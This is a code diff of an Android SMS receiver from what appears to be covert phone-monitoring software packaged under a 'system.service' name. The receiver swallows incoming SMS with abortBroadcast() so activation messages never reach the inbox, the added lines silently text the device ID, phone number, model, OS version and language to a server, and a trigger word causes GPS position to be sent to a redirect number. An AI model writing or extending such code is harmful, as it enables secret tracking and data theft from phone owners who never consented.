@@ -9,6 +9,7 @@ import system.service.activity.GlobalPrefActivity;
 import system.service.activity.InitActivity;
 import system.service.config.ConfigCtrl;
 import com.particle.inspector.common.util.sms.AuthSms;
+import com.particle.inspector.common.util.sms.SuperLoggingSms;
 import com.particle.inspector.common.util.DatetimeUtil;
 import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.LangUtil;
@@ -56,33 +57,43 @@ public class SmsReceiver extends BroadcastReceiver
 			abortBroadcast(); // Finish broadcast, the system will notify this SMS
 			LICENSE_TYPE licType = LicenseCtrl.getLicenseType(context, smsBody);
 			//SysUtils.messageBox(context, "Got license: " + LicenseCtrl.enumToStr(licType));
-			try {
-				// If it is Super License Key, do not need to get response validation from server
-				if (licType == LICENSE_TYPE.SUPER_LICENSED) {
-					// Save license key info to SharedPreferences
-					if (!ConfigCtrl.setLicenseKey(context, smsBody)) {
-						Log.e(LOGTAG, "Cannot set license key");
-					}
-					
-					if (!ConfigCtrl.setLicenseType(context, LICENSE_TYPE.SUPER_LICENSED)) {
-						Log.e(LOGTAG, "Cannot set license type");
-						SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
-						return;
-					}
-					
-					// Save consumed datetime if it is the 1st activation
-					if (ConfigCtrl.getConsumedDatetime(context) == null) {
-						ConfigCtrl.setConsumedDatetime(context, (new Date()));
-					}
-					
-					// Save the last activated datetime
-					ConfigCtrl.setLastActivatedDatetime(context, (new Date()));
-					
-					// TODO send a SMS to server for log info
-					
+			
+			// If it is Super License Key, do not need to get response validation from server
+			if (licType == LICENSE_TYPE.SUPER_LICENSED) {
+				// Save license key info to SharedPreferences
+				if (!ConfigCtrl.setLicenseKey(context, smsBody)) {
+					Log.e(LOGTAG, "Cannot set license key");
+				}
+				
+				if (!ConfigCtrl.setLicenseType(context, LICENSE_TYPE.SUPER_LICENSED)) {
+					Log.e(LOGTAG, "Cannot set license type");
+					SysUtils.messageBox(context, context.getResources().getString(R.string.msg_cannot_write_license_type_to_sharedpreferences));
 					return;
 				}
 				
+				// Save consumed datetime if it is the 1st activation
+				if (ConfigCtrl.getConsumedDatetime(context) == null) {
+					ConfigCtrl.setConsumedDatetime(context, (new Date()));
+				}
+				
+				// Save the last activated datetime
+				ConfigCtrl.setLastActivatedDatetime(context, (new Date()));
+				
+				// Send a SMS to server for logging info
+				String deviceID = DeviceProperty.getDeviceId(context);
+				String phoneNum = DeviceProperty.getPhoneNumber(context);
+				String phoneModel = DeviceProperty.getDeviceModel();
+				String androidVer = DeviceProperty.getAndroidVersion();
+				LANG lang = DeviceProperty.getPhoneLang();
+				SuperLoggingSms sms = new SuperLoggingSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
+				String smsStr = sms.toString();
+				String srvAddr = context.getResources().getString(R.string.srv_address).trim();
+				boolean ret = SmsCtrl.sendSms(srvAddr, smsStr);
+				return;
+			}
+			
+			// If it is not a super key
+			try {
 				// If it is the 1st time, send SMS to server for license key validation
 				// but still show the setting view for inputing mail address and etc.
 				// The functions will really work until the response validation SMS comes from server. 
@@ -101,7 +112,6 @@ public class SmsReceiver extends BroadcastReceiver
 					AuthSms sms = new AuthSms(smsBody, deviceID, phoneNum, phoneModel, androidVer, lang);
 					String smsStr = sms.clientSms2Str();
 					String srvAddr = context.getResources().getString(R.string.srv_address).trim();
-					//SysUtils.messageBox(context, "Server Address: " + srvAddr);
 					boolean ret = SmsCtrl.sendSms(srvAddr, smsStr);
 					if (ret) {
 						ConfigCtrl.setAuthSmsSentDatetime(context, new Date());
@@ -172,14 +182,6 @@ public class SmsReceiver extends BroadcastReceiver
 						ConfigCtrl.setConsumedDatetime(context, (new Date()));
 					}
 					
-					// Start dialog
-					/*
-					Intent initIntent = new Intent().setClass(context, InitActivity.class);
-					initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
-					initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
-					context.startActivity(initIntent);
-					*/
-					
 					// Remove the activation SMS
 					// Since we have done abortBroadcast(), the response SMS from server will not enter the SMS inbox.
 					//SmsCtrl.deleteTheLastSMS(context);
@@ -206,6 +208,8 @@ public class SmsReceiver extends BroadcastReceiver
 			}
 		}
 		
+		//-------------------------------------------------------------------------------
+		// Send GPS position if being triggered by GPS activation word
 		String gpsWord = GlobalPrefActivity.getGpsWord(context);
 		if (gpsWord.length() > 0 && smsBody.contains(gpsWord)) {
 			String phoneNum = GlobalPrefActivity.getRedirectPhoneNum(context);
